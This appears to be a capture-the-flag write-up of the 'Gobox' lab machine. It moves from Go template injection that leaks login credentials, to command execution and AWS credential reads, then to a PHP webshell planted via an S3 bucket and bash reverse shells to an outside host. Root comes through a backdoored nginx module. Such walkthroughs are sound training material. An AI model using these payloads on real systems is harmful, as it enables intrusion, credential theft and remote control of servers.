---
layout: post
title: "gobox"
date: 2025-10-29 
categories: CTF
---
# gobox

# Summary

- All port scan
- port 8080; golang login; vulnerable to SSTI; retrieve struct to get login password
- call method with SSTI to execute command on docker; discover aws; aws bucket website; which syncs to the actual webserver
- inject php webshell; copy to s3 bucket; webshell hosted on main site; reverse shell
- check nginx configuration (/etc/nginx/sites-enabled/default) to find port 8000 hosting NginxExecute; find module that executes system command in /usr/share/nginx/modules
- use strings on .so file to find command that uses .run
- execute reverse shell with NginxExecute using curl; root on machine

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/gobox 10.10.11.113

22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http       nginx
|_http-title: Hacking eSports | {{.Title}}
8080/tcp open     http       nginx
|_http-title: Hacking eSports | Home page
9000/tcp filtered cslistener
9001/tcp filtered tor-orport
9002/tcp filtered dynamid
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Let’s scan all ports:

```bash
sudo nmap -p- 10.10.11.113 -v --min-rate=10000

22/tcp   open     ssh
80/tcp   open     http
4566/tcp open     kwtc
8080/tcp open     http-proxy
9000/tcp filtered cslistener
9001/tcp filtered tor-orport
9002/tcp filtered dynamid
```

Let’s use default script on the additional port:

```bash
sudo nmap -sC -sV 10.10.11.113 -p 4566 

PORT     STATE SERVICE VERSION
4566/tcp open  http    nginx
|_http-title: 403 Forbidden

```

## Web

### Port 80

We get an nginx web server. Let’s visit the web page:

```bash
http://10.10.11.113
```

![image.png]({{ site.baseurl }}/assets/gobox/image.png)

Let’s fuzz for subdir:

```bash
feroxbuster -u http://10.10.11.113 -C 404

200      GET       10l       12w       68c http://10.10.11.113/css/main.css
200      GET      589l     3557w   301221c http://10.10.11.113/header.png
200      GET     5003l    30313w  2346896c http://10.10.11.113/bottom.png
200      GET       54l      190w     1803c http://10.10.11.113/
```

Not much. 

### Port 8080

![image.png]({{ site.baseurl }}/assets/gobox/image%201.png)

A sign in page.

There is a Forgot Password function. Let’s send an email and capture the requets:

![image.png]({{ site.baseurl }}/assets/gobox/image%202.png)

In the response, we see X-forwarded-server says golang; this is probably a golang login form. Let’s search up exploits relating to golang login form.

First, let’s fuzz for subdir:

```bash
feroxbuster -u http://10.10.11.113:8080 -C 404

[####################] - 33s    30000/30000   898/s   http://10.10.11.113:8080/ 
[####################] - 34s    30000/30000   877/s   http://10.10.11.113:8080/forgot/ 
```

ffuf:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.11.113:8080/FUZZ -fs 1752

forgot                  [Status: 301, Size: 43, Words: 3, Lines: 3, Duration: 20ms]
http%3A%2F%2Fwww        [Status: 301, Size: 45, Words: 3, Lines: 3, Duration: 31ms]
http%3A%2F%2Fyoutube    [Status: 301, Size: 49, Words: 3, Lines: 3, Duration: 35ms]
http%3A%2F%2Fblogs      [Status: 301, Size: 47, Words: 3, Lines: 3, Duration: 41ms]
http%3A%2F%2Fblog       [Status: 301, Size: 46, Words: 3, Lines: 3, Duration: 19ms]
**http%3A%2F%2Fwww      [Status: 301, Size: 51, Words: 3, Lines: 3, Duration: 21ms]
http%3A%2F%2Fcommunity  [Status: 301, Size: 51, Words: 3, Lines: 3, Duration: 26ms]
http%3A%2F%2Fradar      [Status: 301, Size: 47, Words: 3, Lines: 3, Duration: 30ms]
http%3A%2F%2Fjeremiahgrossman [Status: 301, Size: 58, Words: 3, Lines: 3, Duration: 34ms]
http%3A%2F%2Fweblog     [Status: 301, Size: 48, Words: 3, Lines: 3, Duration: 33ms]
http%3A%2F%2Fswik       [Status: 301, Size: 46, Words: 3, Lines: 3, Duration: 32ms]
```

We know that golang might be susceptible to Server Side Template Injection: https://dev.to/pirateducky/ssti-method-confusion-in-go-517p, https://onsecurity.io/article/go-ssti-method-research/, https://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to

The `{{` escapes HTML and prints the data struct.

In the /forgot dir, let’s try sending our injection:

```bash
{{ . }}
```

```bash
POST /forgot/ HTTP/1.1
Host: 10.10.11.113:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://10.10.11.113:8080
Connection: keep-alive
Referer: http://10.10.11.113:8080/forgot/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email={{.}}
```

Response:

![image.png]({{ site.baseurl }}/assets/gobox/image%203.png)

We get the user and password.

## Foothold

Let’s login:

```bash
ippsec@hacking.esports:ippsSecretPassword
```

After logging in, we get the source code:

![image.png]({{ site.baseurl }}/assets/gobox/image%204.png)

The DebugCmd method executes system command and allows users to also add an argument. Let’s try it out:

```bash
{{ .DebugCmd "id" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%205.png)

Let’s try getting a reverse shell

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.3/4444 0>&1'
```

![image.png]({{ site.baseurl }}/assets/gobox/image%206.png)

We get a Bad Gateway error. Maybe our machine is not reachable. Let’s check the IP of the target:

```bash
email={{ .DebugCmd "ip a" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%207.png)

```bash
{{ .DebugCmd "cat /etc/hosts" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%208.png)

Let’s also check our hostname:

```bash
{{ .DebugCmd "hostname" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%209.png)

Since the hostname is aws, let’s see if there’s aws storage. First check our  env:

```bash
{{ .DebugCmd "env" }}

OR 

{{ .DebugCmd "~/.aws/credentials" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2010.png)

The keys are in env, so it lets us communicate with aws. Let’s check if the binary is on the machine:

```bash
{{ .DebugCmd "which aws" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2011.png)

It is. Let’s list buckets:

```bash
{{ .DebugCmd "aws s3 ls" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2012.png)

We have a bucket `website`. 

Let’s look inside:

```bash
{{ .DebugCmd "aws s3 ls s3://website" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2013.png)

This looks like the main website on port 80. Let’s try uploading a web shell. First, create our webshell:

```bash
<?php system($_REQUEST["cmd"]); ?>
```

Store this in a file and base64 encode it:

```bash
base64 webshell.php

PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pgo=
```

Now upload it; copy to temp file on server, verify integrity, copy to s3 bucket:

```bash
#write to tmp file
{{ .DebugCmd "echo -n 'PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pgo=' | base64 -d > /tmp/web" }}

#verify 
{{ .DebugCmd "cat /tmp/web" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2014.png)

Let’s check base64 encoding:

```bash
{{ .DebugCmd "base64 /tmp/web" }}

#response

             Email Sent To: PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pgo=
             
             
#verify 
echo -n 'PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pgo=' | base64 -d 

<?php system($_REQUEST["cmd"]); ?>
```

Now copy it to website:

```bash
{{ .DebugCmd "aws s3 cp /tmp/web s3://website/web.php" }}
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2015.png)

Now let’s visit our webshell:

```bash
http://10.10.11.113/web.php?cmd=id
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2016.png)

Let’s get a reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.3/4444 0>&1'
```

Start a listener and execute:

```bash
nc -lnvp 4444
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2017.png)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2018.png)

## Privilege Escalation

Let’s check nginx configuration files.

```bash
cd /etc/nginx/sites-enabled

cat default

server {
        listen 4566 default_server;

        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                if ($http_authorization !~ "(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz(.*)") {
                    return 403;
                }
                proxy_pass http://127.0.0.1:9000;
        }

}

server {
        listen 80;
        root /opt/website;
        index index.php;

        location ~ [^/]\.php(/|$) {
            fastcgi_index index.php;
            fastcgi_param REQUEST_METHOD $request_method;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param QUERY_STRING $query_string;

            fastcgi_pass unix:/tmp/php-fpm.sock;
        }
}

server {
        listen 8080;
        add_header X-Forwarded-Server golang;
        location / {
                proxy_pass http://127.0.0.1:9001;
        }
}

server {
        listen 127.0.0.1:8000;
        location / {
                command on;
        }
}

```

Seems like there is a secret dir on port 4566, we can only access it if we include the secret header. 

```bash
curl -H "Authorization: SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz" http://10.10.11.113:4566

{"status": "running"}
```

But not much else. Let’s investigate the other interesting port, port 8000. There is a strange command on; string. Let’s search up what this could be:

```bash
"command on;" nginx github
```

We find this: https://github.com/limithit/NginxExecute

![image.png]({{ site.baseurl }}/assets/gobox/image%2019.png)

Seems like we can execute command via 

```bash
curl -g "http://localhost:8000/?system.run[id]"

curl: (52) Empty reply from server

```

In the github page, modules are loaded here:

![image.png]({{ site.baseurl }}/assets/gobox/image%2020.png)

Let’s take a look on the target:

```bash
cd /etc/nginx

ls

conf.d          koi-win            nginx.conf       sites-enabled
fastcgi.conf    mime.types         proxy_params     snippets
fastcgi_params  modules-available  scgi_params      uwsgi_params
koi-utf         modules-enabled    sites-available  win-utf
```

```bash
cd modules-enabled
ls -al

total 20
drwxr-xr-x 2 root root 4096 Aug 26  2021 .
drwxr-xr-x 8 root root 4096 Aug 26  2021 ..
-rw-r--r-- 1 root root   48 Aug 23  2021 50-backdoor.conf
lrwxrwxrwx 1 root root   61 Aug 23  2021 50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
lrwxrwxrwx 1 root root   60 Aug 23  2021 50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
lrwxrwxrwx 1 root root   48 Aug 23  2021 50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf
lrwxrwxrwx 1 root root   50 Aug 23  2021 50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
```

```bash
cat 50-backdoor.conf

load_module modules/ngx_http_execute_module.so;
```

The modules for nginx are located in:

```bash
cd /usr/share/nginx/modules
```

We are looking for something similar to system.run:

```bash
strings ngx_http_execute_module.so | grep .run

ippsec.run
```

Let’s try again with this method:

```bash
curl -g "http://localhost:8000/?ippsec.run[id]"

uid=0(root) gid=0(root) groups=0(root)

```

We are now running as root.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.3/9001 0>&1'
```

```bash
curl -g "http://localhost:8000/?ippsec.run[bash -c 'bash -i >& /dev/tcp/10.10.16.3/9001 0>&1']"
```

Start listener:

```bash
nc -lnvp 9001
```

![image.png]({{ site.baseurl }}/assets/gobox/image%2021.png)

The system kicks us off automatically in around 2 seconds. If we upgrade our shell before that we get a stable shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This is because our reverse shell is being killed by the parent process — curl (or the web server) — which exits immediately after running the command. But when we **upgrade to PTY**, we **detach from the parent** → **shell survives**.